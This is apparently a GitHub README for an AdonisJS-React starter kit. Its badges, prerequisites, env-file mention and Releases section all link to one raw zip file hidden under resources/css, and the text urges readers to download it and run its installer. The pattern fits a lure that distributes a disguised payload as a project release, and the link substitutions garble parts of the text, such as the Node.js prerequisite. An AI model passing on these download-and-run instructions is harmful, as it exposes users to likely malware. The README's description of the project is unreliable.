https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip

# AdonisJS-React Starter Kit: Modern Full-Stack Boilerplate with TS & Tailwind

[![Release](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip) [![License](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip) [![Build Status](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)

Table of contents
- Overview
- Why this kit
- Features
- Tech stack
- Monorepo layout
- Prerequisites
- Quick start
- Installation
- Running locally
- Development workflow
- Backend overview (AdonisJS)
- Frontend overview (React + Vite)
- Shared libraries and patterns
- Testing and quality
- Linting and formatting
- Deployment considerations
- Project layout details
- Contributing
- Roadmap
- FAQ
- Release notes
- License

Overview
This is a modern full-stack starter kit that blends React with AdonisJS. It ships with Shadcn UI components, TypeScript, Tailwind CSS, and tRPC. It’s designed as a production-ready monorepo to help you build fast web apps without reinventing the wheel. You get a clean separation between the backend API and the frontend UI, while sharing data types and utilities where it makes sense.

Why this kit
- Fast start for both front-end and back-end teams
- Consistent type sharing across server and client
- A polished UI layer with Shadcn UI and Tailwind CSS
- Strong tooling: TypeScript, Vite, and tRPC
- Monorepo setup that scales as your app grows
- Clear conventions for structuring code, testing, and deployment

Key features
- TypeScript everywhere for safety and maintainability
- Shadcn UI integrated with Tailwind for a cohesive look
- tRPC for end-to-end typed API calls between client and server
- AdonisJS as the back end for robust server features and a friendly DX
- Production-ready monorepo layout with clear boundaries
- Modern dev experience with Vite, hot module replacement, and fast builds
- Ready-to-use environments for local development and quick deployments
- Extensible structure to add more apps or packages as needed

Tech stack
- Frontend: React, TypeScript, Vite, Tailwind CSS, Shadcn UI
- Backend: AdonisJS, TypeScript
- Communication: tRPC
- Monorepo tooling: PNPM (recommended), workspaces
- Styling and UX: Tailwind CSS, Shadcn UI, modern CSS features
- Testing and quality: ESLint, Prettier, Vitest (where supported)

Monorepo layout
- apps/
  - web/           Frontend UI built with React + Vite
  - api/           Backend API powered by AdonisJS
- packages/
  - ui/            Shared UI components and design system
  - utils/         Shared utilities, type helpers, and helpers for API calls
  - types/         Shared TypeScript types across frontend and backend
  - config/        Shared build and lint config for consistency
- docs/            Documentation and guides
- scripts/         Utility scripts for setup, testing, and deployment
- etc/             Ancillary configurations and sample data

Prerequisites
- https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip 18.x or newer
- PNPM 8.x or newer (recommended for monorepos)
- A modern shell (bash/zsh) and Git installed
- Basic familiarity with TypeScript, React, and a backend framework

Quick start
- Create a new project by cloning this repo and installing dependencies
- Start the frontend and backend in parallel
- Visit the local URLs to see the app running
- Use the release assets to bootstrap the project when needed

Installation
- Install dependencies from the repository root
  - pnpm install
  - If you prefer npm or yarn, you can adapt, but PNPM is recommended for monorepos
- Copy or create a local environment file for services (see https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip in the relevant app)
- Ensure your database or data stores are reachable using the environment configuration

Running locally
- Start the backend (AdonisJS)
  - cd apps/api
  - pnpm install
  - pnpm dev
- Start the frontend (React + Vite)
  - cd apps/web
  - pnpm install
  - pnpm dev
- Run both simultaneously using a workspace filter or a script
  - pnpm -w run dev:all
  - Or use a process runner like concurrently if you prefer a single command
- Typical endpoints and pages
  - API: http://localhost:3333 (default AdonisJS port)
  - Web: http://localhost:5173 (default Vite port)
- Environment and data
  - Local databases should be configured via .env files in each app
  - Use the sample https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip to guide the required variables

Development workflow
- Code with a focus on clarity and type safety
- Use shared types to prevent API drift
- Keep UI components small and reusable
- Write unit tests for key utilities and API endpoints
- Run linters and formatters on save or as part of pre-commit hooks
- Document any non-trivial API or UI behavior in docs/

Backend overview (AdonisJS)
- Core responsibilities
  - REST or GraphQL-like API with typed routes
  - DB access via Lucid models
  - Business logic layers and services
  - Security, authentication, and authorization concerns
- How to extend
  - Create services in apps/api/app/Services
  - Add controllers and routes under apps/api/start/routes
  - Add or modify Lucid models under apps/api/app/Models
  - Use environment variables to manage DB connections and credentials
- Common patterns
  - Repository-like data access for testability
  - DTOs for request/response shaping
  - Dependency injection for testability and decoupling
- Example workflow
  - Define a new route
  - Implement a controller
  - Use a service to execute business logic
  - Return a typed response to the client

Frontend overview (React + Vite)
- Core architecture
  - A React app powered by Vite with fast refresh
  - Tailwind CSS for styling and Shadcn UI components for consistent design
  - A typed client communicating with the AdonisJS backend via tRPC
- Key patterns
  - Shared hooks and utilities in packages/utils
  - A design system in packages/ui built with TypeScript
  - Typed API clients and generated types for safe integration
- Component strategy
  - Small, focused components that can be composed
  - Clear separation between presentational and container components
  - Accessibility considerations baked in from the start
- Data flow
  - Use tRPC routes for the API layer
  - Use React Query or built-in fetch wrappers for data fetching and caching
  - Normalize data shapes with shared TypeScript types

Shared libraries and patterns
- UI components
  - Reusable components that match the Shadcn UI aesthetic
  - Theming with Tailwind's dark mode and color tokens
- Utilities
  - HTTP clients with consistent error handling
  - Date/time utilities, formatting helpers, and validation utilities
- Types
  - Shared TypeScript types for API payloads and UI models
  - Utility types for deep partials, pick/omit patterns, and discriminated unions
- Architecture guidance
  - Favor small, testable units
  - Prefer explicit types over any
  - Document decisions and trade-offs in docs/

Testing and quality
- Testing approach
  - Unit tests for utilities and services
  - Integration tests for endpoints and data flows
  - UI tests for critical components
- Tools
  - Vitest for unit and integration tests
  - ESLint for code quality
  - Prettier for consistent formatting
- Test data management
  - Seed scripts for initial data
  - Factory helpers for test objects
- Continuous quality
  - Run tests in CI and pre-commit checks locally
  - Lint and format on commit to keep code clean

Linting and formatting
- ESLint configuration for TypeScript and React
- Prettier with a consistent code style
- Husky or a similar tool to run lint/format on pre-commit
- Encouraged rules
  - Prefer explicit types
  - Avoid console logs in production code
  - Keep functions small and focused

Deployment considerations
- Environment parity
  - Align local, staging, and production environments as closely as possible
- Build steps
  - Build frontend assets with Vite
  - Compile backend code with AdonisJS tooling
- Database and migrations
  - Use migration scripts to evolve the database schema
  - Keep migration history in version control
- Observability
  - Basic logging for backend services
  - Frontend error boundaries and telemetry where appropriate
- Security
  - Sanitize inputs, validate on server
  - Use env-based secrets and avoid hard-coded credentials
- Rollback strategy
  - Maintain a simple rollback plan and a clear release process

Project layout details
- apps/api
  - AdonisJS application with routes, controllers, services, and models
  - https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip provides baseline configuration
- apps/web
  - React app with Vite, Tailwind, and Shadcn UI
  - Type-safe API interactions via tRPC client
- packages/ui
  - The design system and shared components
- packages/utils
  - Shared utilities for data handling, formatting, and helpers
- packages/types
  - Shared TypeScript types used across app and API
- docs
  - Guides, architecture diagrams, and API references
- scripts
  - Setup, seed, test, and deployment scripts

Contributing
- How to contribute
  - Fork the repo, create a feature branch, and open a PR
  - Follow the code style rules and write tests for new features
- Code of conduct
  - Be respectful, inclusive, and collaborative
- How to report issues
  - Use the Issues tab with a clear, reproducible bug report or feature request
- Documentation standards
  - Update docs when you change a public interface
  - Include examples and expected behavior

Roadmap
- Short-term goals
  - Stabilize the monorepo setup and improve developer ergonomics
  - Add more real-world examples and templates for common features
  - Improve onboarding with a guided setup script
- Medium-term goals
  - Expand testing coverage, including end-to-end tests
  - Introduce more plugins and integrations (e.g., auth providers)
- Long-term goals
  - Build a robust CI/CD pipeline with deployment previews
  - Support for multiple themes and localization out of the box

FAQ
- Do I need AdonisJS to use this starter kit?
  - Yes. AdonisJS powers the backend in this setup, providing a solid API surface and server-side features. The frontend talks to it via a typed API layer.
- Can I swap out the frontend framework?
  - The design system and structure are geared toward React, but the architecture allows adapters to other frameworks with some work.
- Is this production-ready?
  - It’s built with production best practices in mind. You should tailor it to your project’s needs and review security and performance considerations for your deployment target.
- How do I add new UI components?
  - Add components to packages/ui, export them from an index, and document usage in docs/components.
- Where can I find release notes?
  - Release notes live in the Releases section of the repository. To download the latest release and bootstrap your project, visit the Releases page: https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip

Release notes
- Versioned changelog and notes are maintained in the Releases section, with migration notes and upgrade guides for changes that affect the public API or breaking changes
- When you want to bootstrap a fresh setup, you should reference the updated release assets and any setup scripts included in the release package
- For the latest release, fetch the asset from the Releases area and run the installer or setup script described there

Releases
- To download the latest release assets and start quickly, visit the Releases page: https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip
- If the link above doesn’t work, check the Releases section for the latest assets and instructions

License
- The project is open source with a permissive license. See the LICENSE file in the repository for details.

And there you go.